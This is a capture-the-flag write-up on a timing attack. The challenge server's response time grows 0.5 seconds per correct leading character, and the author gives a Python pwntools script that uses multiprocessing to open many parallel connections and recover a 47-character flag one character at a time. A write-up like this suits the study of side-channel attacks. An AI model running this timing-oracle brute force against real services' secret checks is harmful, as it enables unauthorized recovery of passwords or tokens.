In this challenge, you input some string, and the server will tell you if it's
the flag or not. The more parts of the substring starting from position 0 you
guess correctly, the slower the server responds (.5 seconds increase for every
correct character). The security term for this is the timing attack problem.

You can easily write a bruteforce script. However, it will take forever to
run: `50 * 47 * 23.5 / 60 = 920` mins approximately. 50 is half the length of
string.printable, or the average number of elements you have to cycle in the
set of guessable characters to be correct. 47 is the number of times the loop
runs because you are given that the flag length is 47. 23.5 is half of 47 or
the average time in seconds the server takes to return your guess.

I am no expert on this but I heard from my university class of the term
multiprocessing, which is where you allocate tasks to multiple cores for
asynchronous execution. This method allowed me to connect to the server
simultaneously 100 times for each guessed character of string.printable, so I
reduced the brute force time by 100 fold, which allowed me to solve this
challenge during the length of the competition. Code below.

```  
from pwn import *  
from string import printable  
import time  
import multiprocess

def guess(x):  
   r = remote('50i9k97k4puypj7bvtngr2yco.ctf.p0wnhub.com', '52400')  
   banner = r.recv(4096)  
   init_prompt = r.recv(4096)  
   start = time.time()  
   r.sendline(x)  
   res = r.recv(4096)  
   end = time.time()  
   r.close()  
   return x[-1], end - start

init = 'HZVIII{'

while len(init) != 47:  
   try:  
       p = multiprocess.Pool(len(printable))  
       d = [x for x in p.map(guess, [init + s for s in printable])]  
       init += max(d, key=lambda a: a[1])[0]  
   except:  
       pass  
```